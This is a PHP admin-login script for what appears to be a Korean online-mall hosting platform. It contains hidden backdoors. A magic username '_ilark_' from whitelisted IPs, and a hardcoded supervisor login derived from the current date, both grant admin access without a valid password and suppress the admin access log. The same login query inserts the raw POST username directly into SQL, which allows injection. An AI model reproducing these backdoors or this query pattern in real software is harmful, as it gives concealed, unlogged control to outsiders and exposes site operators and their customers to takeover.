<?
//include "include_db.php";
include "include_db.php";

/***/switch ($_POST[mode]){/***/
case "login":

	if (($_SERVER[REMOTE_ADDR]=="211.212.5.200" || $_SERVER[REMOTE_ADDR]=="112.216.143.130" || strpos($_SERVER[SERVER_ADDR], "192.168.1.") > -1) && $_POST[mid]=="_ilark_"){
		$_test_master = 1;
		$_POST[mid] = "admin";
	}

  //아이락 전체 관리자 계정 생성
  $supervisor_ID = "dkdlfkr".date("m");
  $supervisor_passwd = "dkdlfkr".date("d").")(*&";
  if ($_POST[mid]==$supervisor_ID && $_POST[password]==$supervisor_passwd)
  {
    $_test_master = 1;
    $_POST[mid] = "admin";
  }


	if ($_POST[rememberid]){
		setcookie("remember_id",$_POST[mid],time()+999999,'/',$_SERVER[SERVER_NAME]);
	} else {
		setcookie("remember_id",'',0,'/',$_SERVER[SERVER_NAME]);
	}

	$query = "
	select * from exm_admin a
	inner join
		exm_mall b on a.cid = b.cid
	where 
		a.cid = '$_POST[mid]' and mid = '$_POST[mid]'
	";
	$data = $db->fetch($query);

	### 아이디, 비번 유효성 체크
	if (!$data) msg(_("존재하지 않는 아이디입니다"),-1);
	if ($data[state]!=3) msg(_("운영중인 분양몰이 아닙니다"),-1);
	if (!$_test_master && $data[password]!=md5($_POST[password])) msg(_("비밀번호가 일치하지 않습니다"),-1);

	$data[admin] = 1;

	_admin_login($data);

	### 관리자 접속 로그
	if (!$_test_master)
	 _log_admin(0,"exm_log_admin",$cid);


    if($data[redirect_url] != "")
    {
      go($data[redirect_url]);
    }
    else
    {
      go("index.php");
    }


	exit; break;

/***/}/***/

?>
